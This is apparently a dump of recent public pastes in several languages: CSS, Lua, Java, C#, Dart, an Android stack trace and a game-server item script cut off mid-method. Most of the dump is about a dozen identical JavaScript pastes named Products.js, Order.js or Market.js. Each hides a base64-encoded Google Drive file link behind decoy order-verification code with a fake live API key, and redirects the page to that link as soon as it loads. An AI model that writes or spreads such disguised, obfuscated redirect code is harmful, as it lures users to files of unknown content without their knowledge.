srCR3q9m,Untitled,Ratqueenkslskskwkw,JavaScript,Sunday 13th of April 2025 04:55:42 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/84696/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
wR5pDqMf,Untitled,geminilabs,CSS,Sunday 13th of April 2025 04:50:21 AM CDT,".glsr[data-theme] [data-tag]:empty {
  display: none;
}
.glsr[data-theme] .glsr-review:has(.youtube-wrapper) div:has(> [data-tag=""rating""]),
.glsr-modal[data-theme] [data-type]:has(.youtube-wrapper) div:has(> [data-tag=""rating""]) {
  display: none;
}
.youtube-wrapper {
    position: relative;
    width: 100%;
    overflow: hidden;
    padding-bottom: 56.25%; /* 16:9 ratio */
}
.youtube-wrapper iframe {
    border-radius: 5px;
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
}"
gvEaLhat,Mono pannel,DarkSiders061,Lua,Sunday 13th of April 2025 04:43:03 AM CDT,"--Look throughout the code for comments like this. They explain what to do to change things.

--What side the monitor will be on (change this if needed)
modem = peripheral.find(""modem"") or error(""No modem attached"", 0)
m = peripheral.find(""monitor"") or error(""No monitor attached"", 0)


--button on/off color
bactive = colors.cyan
binactive=colors.gray
--text on/off color
tactive=colors.white
tinactive=colors.black
--Background color
bgcolor = colors.black


buttons = {}
      
      

      function newButton(id,xmin,xmax,ymin,ymax,text,func)
        buttons[id] = {}
        buttons[id][""xmin""] = xmin
        buttons[id][""xmax""] = xmax
        buttons[id][""ymin""] = ymin
        buttons[id][""ymax""] = ymax
        buttons[id][""active""] = false
        buttons[id][""text""] = text
        buttons[id][""func""] = func
        
      end
      ---------------------------------------------------------------------------------
      function printButton(id)
        ymin = buttons[id][""ymin""]
        ymax = buttons[id][""ymax""]
        xmin = buttons[id][""xmin""]
        xmax = buttons[id][""xmax""]
        text = buttons[id][""text""]
        ia = buttons[id][""active""]

       

            width = xmax - xmin
            height = ymax - ymin
            
            if ia then m.setBackgroundColor(bactive) m.setTextColor(tactive)
			else m.setBackgroundColor(binactive) m.setTextColor(tinactive) 
					   
            end
			
            for j = ymin,ymax do
             m.setCursorPos(xmin,j)
              for i = xmin,xmax do

                m.write("" "")

             end

           end 

         
        m.setCursorPos(xmin + width / 2 - #text / 2 + 1,ymin + height / 2)

       m.write(text)
       m.setBackgroundColor(bgcolor)
        
      end
      ----------------------------------------------------------------------------------
      function refreshButtons()
        for i = 1,#buttons do
          printButton(i)
        end
      end
    function checkxy( x,y )
        for i = 1, #buttons do 
          if y >= buttons[i][""ymin""] and y <= buttons[i][""ymax""] then
            if x >= buttons[i][""xmin""] and x <= buttons[i][""xmax""] then

              
              buttons[i][""active""] = not buttons[i][""active""]
              clicked = i
              if buttons[i][""func""] ~= nil then

                buttons[i][""func""]()

                
              end
            end
          end
        end
      end


bool1 = false
bool2 = false
bool3 = false
rs.setBundledOutput(""back"",0)




--White is pigman, Orange is witch, purple is wither skele (Bundled cable)


function start()
	
  if bool1 then
	bool1 = not bool1
	   rs.setOutput(""front"", true)
	   sleep(1)
       rs.setOutput(""front"", false)
  end
end

--You can add more buttons and also change the size of them. The format is startingx,startingy,endingx,endingy,text,function

--The buttons
newButton(1, 2,24,2,6,""Start"",start)
------------------------------------------------



m.clear()
refreshButtons()


--main loop
while true do
	e,side,x,y = os.pullEvent(""monitor_touch"")
	checkxy(x,y)
  
	refreshButtons()
end
"
MTrV92sn,Products.js,Ratqueenkslskskwkw,JavaScript,Sunday 13th of April 2025 04:40:19 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/77286/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
pNiDEiUF,Order.js,Ratqueenkslskskwkw,JavaScript,Sunday 13th of April 2025 04:24:45 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/14512/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
c8dsHHQ8,Market.js,Ratqueenkslskskwkw,JavaScript,Sunday 13th of April 2025 04:09:22 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/65788/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
kneSTv8t,[NP] Streaming Platform,dzocesrce,Java,Sunday 13th of April 2025 04:05:10 AM CDT,"import java.io.OutputStream;
import java.io.PrintWriter;
import java.util.*;
import java.util.stream.Collectors;
import java.util.List;
import java.io.PrintStream;
import java.io.PrintWriter;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.stream.Collectors;
import java.util.ArrayList;
import java.util.Comparator;
import java.util.List;

class TVShow extends Show{

    List<List<Integer>> episodes;
    List<Double> episode_ratings;

    public TVShow(String name, List<String> genres,List<List<Integer>> episodes) {
        super(name, genres);
        this.episodes= episodes;
        this.episode_ratings= new ArrayList<>();
        calculateRating(episodes);
    }

    public void calculateRating(List<List<Integer>> episodes) {
        for(List<Integer> episode : episodes){
            episode_ratings.add(((double)episode.stream().mapToInt(i->i).sum()/episode.stream().count())
                    *Math.min(episode.size()/20.0,1.00));

        }

    }

    @Override
    public double averageRating() {
        return (episode_ratings.stream().sorted(Comparator.reverseOrder()).limit(3).mapToDouble(i->i).sum())/3.00;
    }


    @Override
    public ShowType getShowType() {
        return ShowType.TV_Show;
    }

    @Override
    public String getNumberOfEpisodes() {
        return String.format(""(%d episodes)"",this.episodes.size());
    }


    @Override
    public int compareTo(Show other) {
        return Double.compare(this.averageRating(),other.averageRating());
    }
}

enum ShowType {
    Movie,
    TV_Show
}

abstract class Show implements Comparable<Show> {
    private String name;
    private List<String> genres;

    public Show(String name,List<String> genres) {
        this.name = name;
        this.genres= genres;
    }
    
        public List<String> getGenres() {
        return genres;
    }

    public abstract double averageRating();

    public abstract ShowType getShowType();

    public abstract String getNumberOfEpisodes();


    @Override
    public String toString() {


        return String.format(""%s %s %.4f %s"",getShowType().name().replace(""_"","" ""),name,averageRating(),getNumberOfEpisodes());

    }
}


class StreamingPlatform {
    private List<Show> shows;

    public StreamingPlatform() {
        this.shows = new ArrayList<>();
    }

    public void addItem(String data) {
    String[] parts = data.split("";"");
    String name= parts[0];
    List<String> genres = Arrays.stream(parts[1].split("","")).collect(Collectors.toList());
    List<Integer> ratings = new ArrayList<>();
    List<List<Integer>> episodes = new ArrayList<>();
        if(parts.length<4){
            ratings = Arrays.stream(parts[2].split(""\\s+""))
                    .map(i-> Integer.parseInt(i)).collect(Collectors.toList());
            this.shows.add(new Movie(name,genres,ratings));
        }

        else{
            for(int i=2;i<parts.length;i++){
                ratings = Arrays.stream(parts[i].split(""\\s+"")).skip(1)
                        .map(rating-> Integer.parseInt(rating)).collect(Collectors.toList());
                episodes.add(ratings);
            }
            this.shows.add(new TVShow(name,genres,episodes));
    }


    }

    public void listAllItems(PrintStream out) {
        PrintWriter printWriter = new PrintWriter(out);

        shows.stream().sorted(Comparator.reverseOrder()).forEach(i->printWriter.println(i));

        printWriter.flush();
    }

    public void listFromGenre(String genre, PrintStream out) {

        PrintWriter printWriter = new PrintWriter(out);

        shows.stream().filter(i-> i.getGenres().contains(genre))
                .sorted(Comparator.reverseOrder())
                .forEach(i->printWriter.println(i));

        printWriter.flush();
    }
}

class Movie extends Show{

    private List<Integer> ratings;
    private ShowType showType;
    public Movie(String name, List<String> genres, List<Integer> ratings) {
        super(name, genres);
        this.ratings= ratings;
        this.showType= ShowType.Movie;
    }


    @Override
    public double averageRating() {
        return ((double)ratings.stream().mapToInt(i->i).sum()/ratings.stream().count())*Math.min(ratings.size()/20.0,1.00) ;

    }

    @Override
    public ShowType getShowType() {
        return ShowType.Movie;
    }

    @Override
    public String getNumberOfEpisodes() {
        return """";
    }

    @Override
    public int compareTo(Show other) {
        return Double.compare(this.averageRating(),other.averageRating());
    }

}


public class StreamingPlatformTest {
    public static void main(String[] args) {
        Scanner sc = new Scanner(System.in);
        StreamingPlatform sp = new StreamingPlatform();
        while (sc.hasNextLine()){
            String line = sc.nextLine();
            String [] parts = line.split("" "");
            String method = parts[0];
            String data = Arrays.stream(parts).skip(1).collect(Collectors.joining("" ""));
            if (method.equals(""addItem"")){
                sp.addItem(data);
            }
            else if (method.equals(""listAllItems"")){
                sp.listAllItems(System.out);
            } else if (method.equals(""listFromGenre"")){
                System.out.println(data);
                sp.listFromGenre(data, System.out);
            }
        }

    }
}"
pyVNYGWc,Pierwszy,cuniszkiewicz,C#,Sunday 13th of April 2025 03:57:09 AM CDT,"using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace PierwszeZajecia
{
    internal class Program
    {
        static void Main(string[] args)
        {
            string imie, nazwisko, mail;
            int wiek;
            double sredniaOcen;

            Console.Write(""Podaj imię: "");
            imie = Console.ReadLine();
            Console.Write(""Podaj nazwisko: "");
            nazwisko = Console.ReadLine();
            Console.Write(""Podaj wiek: "");
            //wiek = int.Parse(Console.ReadLine());
            wiek = Convert.ToInt32(Console.ReadLine());
            
            Console.Write(""Podaj średnią ocen: "");
            //sredniaOcen = double.Parse(Console.ReadLine());
            sredniaOcen = Convert.ToDouble(Console.ReadLine());

            
            mail = imie + ""."" + nazwisko + ""@byd.pl"";
            


            //Console.WriteLine(""Cześć "" + imie + "" "" + nazwisko + "", wiek: ""+ wiek + "" lat"");
            //Console.WriteLine(""Cześć {0} {1}, wiek: {2} lat"",imie, nazwisko, wiek);
            Console.WriteLine($""Cześć {imie} {nazwisko}, wiek: {wiek} lat"");
           

           

            Console.ReadKey(); //program zaczeka na wciśnięcie przycisku
        }
    }
}

"
VQgFv1Um,Untitled,Ratqueenkslskskwkw,JavaScript,Sunday 13th of April 2025 03:53:59 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/84417/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
myew2Bng,Products.js,Ratqueenkslskskwkw,JavaScript,Sunday 13th of April 2025 03:38:36 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/16387/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
jTC3R3AR,listile listview flutter,muhaiminurabir,Dart,Sunday 13th of April 2025 03:30:56 AM CDT,"              ListView.builder(
                shrinkWrap: true,
                itemCount: 4,
                itemBuilder: (context, index) {
                  return Container(
                    margin: EdgeInsets.only(bottom: AppSpacing.marginS.bottom),
                    child: Card(
                      color: grey,
                      child: ListTile(
                        contentPadding: EdgeInsets.symmetric(
                            horizontal: AppSpacing.paddingS.horizontal,
                            vertical: AppSpacing.paddingXS.vertical),
                        leading: Image.asset(
                          ""assets/png/Hadith.png"", // Replace with actual URL
                          fit: BoxFit.cover,
                        ),
                        title: Text(
                          ""Taiba Al Diyafah"",
                          style: TextStyle(
                              fontWeight: FontWeight.w700,
                              fontSize: 12,
                              color: textColorPrimary),
                        ),
                        subtitle: Text(""Lorem ipsum dolor sit"",
                            style: TextStyle(
                                fontWeight: FontWeight.w400,
                                fontSize: 12,
                                color: textColorPrimary)),
                        trailing: const Icon(Icons.arrow_forward_ios,
                            color: Colors.green),
                        onTap: () {
                          Navigator.pushNamed(
                            context,
                            RouteNames.discoverDetailsPage,
                            arguments: {'title': ""Ihram""},
                          );
                        },
                      ),
                    ),
                  );
                },
              ),
"
4SbQVRwc,image picture flutter,muhaiminurabir,Dart,Sunday 13th of April 2025 03:29:44 AM CDT,"              Card(
                shape: RoundedRectangleBorder(
                    borderRadius: BorderRadius.circular(10)),
                clipBehavior: Clip.hardEdge,
                elevation: 2,
                child: Container(
                  height: 150,
                  decoration: BoxDecoration(
                    color: Colors.white,
                    image: DecorationImage(
                      image: AssetImage(""assets/png/kibla2.png""),
                      fit: BoxFit.fill,
                    ),
                  ),
                  alignment: Alignment.center,
                  padding: AppSpacing.paddingS,
                ),
              ),
"
y2VimpZ2,Order.js,Ratqueenkslskskwkw,JavaScript,Sunday 13th of April 2025 03:23:14 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/06877/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
gDXTJGtT,Market.js,Ratqueenkslskskwkw,JavaScript,Sunday 13th of April 2025 03:07:50 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/29162/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
24SC5zdA,2025-04-13T16:55:05.242548,powerampache,PHP,Sunday 13th of April 2025 02:55:06 AM CDT,"1.01-79 (79) - DB: 83
luci.sixsixsix.powerampache2.domain.errors.ScrobbleException: {""errorAction"":""record_play"",""errorCode"":""4701"",""errorMessage"":""Invalid Login - invalid session token"",""errorType"":""system""}
	at luci.sixsixsix.powerampache2.data.SongsRepositoryImpl.scrobbleApiCall(SongsRepositoryImpl.kt:652)
	at luci.sixsixsix.powerampache2.data.SongsRepositoryImpl.access$scrobbleApiCall(SongsRepositoryImpl.kt:80)
	at luci.sixsixsix.powerampache2.data.SongsRepositoryImpl$scrobbleApiCall$1.invokeSuspend(Unknown Source:15)
	at kotlin.coroutines.jvm.internal.BaseContinuationImpl.resumeWith(ContinuationImpl.kt:33)
	at kotlinx.coroutines.DispatchedTask.run(DispatchedTask.kt:104)
	at android.os.Handler.handleCallback(Handler.java:959)
	at android.os.Handler.dispatchMessage(Handler.java:100)
	at android.os.Looper.loopOnce(Looper.java:249)
	at android.os.Looper.loop(Looper.java:337)
	at android.app.ActivityThread.main(ActivityThread.java:9604)
	at java.lang.reflect.Method.invoke(Native Method)
	at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:615)
	at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:936)

scrobble() - "
gZpi61gQ,Untitled,Ratqueenkslskskwkw,JavaScript,Sunday 13th of April 2025 02:52:21 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/34164/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
zxPApxP2,Products.js,kammex,JavaScript,Sunday 13th of April 2025 02:36:32 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/37040/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
sVXrtJHE,l2jsquad extractable new boxs,Reanimation06,Java,Sunday 13th of April 2025 02:29:40 AM CDT,"scripts\handler\items\Extractable.java
------------------------------------------------------------------------------ 

	private static final int[] ITEM_IDS = new int[]{8534,
			8535,

			59932,
			59933,
			59934,
			59935,
			59936,

------------------------------------------------------------------------------

			case 59932:
				use59932(player, ctrl);
				break;
			case 59933:
				use59933(player, ctrl);
				break;
			case 59934:
				use59934(player, ctrl);
				break;
			case 59935:
				use59935(player, ctrl);
				break;
			case 59936:
				use59936(player, ctrl);
				break;


------------------------------------------------------------------------------



		// Daily Gift Box
	private void use59932(Player player, boolean ctrl)
		{  
	        int items[][] = new int[][] 
	          { 
	           // itemId, min, max 
	    			  {57, 10000000, 20000000}, 
	    			  {952, 1, 2}, 
	    			  {951, 1, 2}, 
	    			  {948, 1, 2}, 
	    			  {947, 1, 2}, 
	    			  {730, 1, 2}, 
	    			  {729, 1, 2}, 
	    			  {960, 1, 2}, 
	    			  {956, 1, 2}, 
	    			  {6574, 1, 2}, 
	    			  {6573, 1, 2}, 
	    			  {6572, 1, 2}, 
	    			  {6571, 1, 2}, 
	    			  {6570, 1, 2}, 
	    			  {6569, 1, 2}, 
	    			  {6578, 1, 2}, 
	    			  {6577, 1, 2}, 
	    			  {22016, 1, 1}, 
	    			  {22014, 1, 1}, 
	    			  {22017, 1, 1}, 
	    			  {22014, 1, 1}, 
	    			  {20520, 1, 1}, 
	    			  {20519, 1, 1}, 
	    			  {14008, 1, 1}, 
	    			  {14169, 5, 10}, 
	    			  {6622, 2, 5}, 
	    			  {9625, 1, 5}, 
	    			  {9626, 1, 5}, 
	    			  {9627, 1, 5}, 
	    			  {9546, 2, 10}, 
	    			  {9547, 2, 10}, 
	    			  {9548, 2, 10}, 
	    			  {9549, 2, 10}, 
	    			  {9550, 2, 10}, 
	    			  {9551, 2, 10}, 
	    			  {9552, 1, 5}, 
	    			  {9553, 1, 5}, 
	    			  {9554, 1, 5}, 
	    			  {9555, 1, 5}, 
	    			  {9556, 1, 5}, 
	    			  {9557, 1, 5}, 
	    			  {5990, 5, 10}, 
	    			  {37007, 5, 10}, 
	    			  {6392, 1000, 5000}, 
	    			  {59931, 10, 20}
	          };

	          double chances[] = new double[] 
	          { 
	           // chance 
	        		  100.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  03.00,
	        		  04.00,
	        		  03.00,
	        		  04.00,
	        		  03.00,
	        		  04.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00
	          }; 

	       capsulate(player, items, chances); 
	    }
		// Special Gift Box
	private void use59933(Player player, boolean ctrl)
		{  
	        int items[][] = new int[][] 
	          { 
	           // itemId, min, max 
	    			  {6574, 1, 2}, 
	    			  {6573, 1, 2}, 
	    			  {6572, 1, 2}, 
	    			  {6571, 1, 2}, 
	    			  {6570, 1, 2}, 
	    			  {6569, 1, 2}, 
	    			  {6578, 1, 2}, 
	    			  {6577, 1, 2}, 
	    			  {22016, 1, 2}, 
	    			  {22014, 1, 2}, 
	    			  {22017, 1, 2}, 
	    			  {22015, 1, 2}, 
	    			  {20520, 1, 2}, 
	    			  {20519, 1, 2}, 
	    			  {22020, 1, 1}, 
	    			  {22018, 1, 1}, 
	    			  {22021, 1, 1}, 
	    			  {22019, 1, 1}, 
	    			  {20522, 1, 1}, 
	    			  {20521, 1, 1}, 
	    			  {20204, 1, 1}, 
	    			  {20207, 1, 1}, 
	    			  {22304, 1, 1}, 
	    			  {22302, 1, 1}, 
	    			  {14008, 1, 1}, 
	    			  {14169, 5, 10}, 
	    			  {6622, 2, 5}, 
	    			  {9625, 1, 5}, 
	    			  {9626, 1, 5}, 
	    			  {9627, 1, 5}, 
	    			  {9546, 2, 10}, 
	    			  {9547, 2, 10}, 
	    			  {9548, 2, 10}, 
	    			  {9549, 2, 10}, 
	    			  {9550, 2, 10}, 
	    			  {9551, 2, 10}, 
	    			  {9552, 1, 5}, 
	    			  {9553, 1, 5}, 
	    			  {9554, 1, 5}, 
	    			  {9555, 1, 5}, 
	    			  {9556, 1, 5}, 
	    			  {9557, 1, 5}, 
	    			  {5990, 5, 10}, 
	    			  {37007, 5, 10}, 
	    			  {6392, 1000, 5000}, 
	    			  {59931, 10, 20}
	          };

	          double chances[] = new double[] 
	          { 
	           // chance 
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  04.00,
	        		  03.00,
	        		  04.00,
	        		  03.00,
	        		  04.00,
	        		  03.00,
	        		  01.00,
	        		  01.00,
	        		  01.00,
	        		  01.00,					  
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00
	          }; 

	       capsulate(player, items, chances); 
	    }
		// Vote Gift Box
	private void use59934(Player player, boolean ctrl)
		{  
	        int items[][] = new int[][] 
	          { 
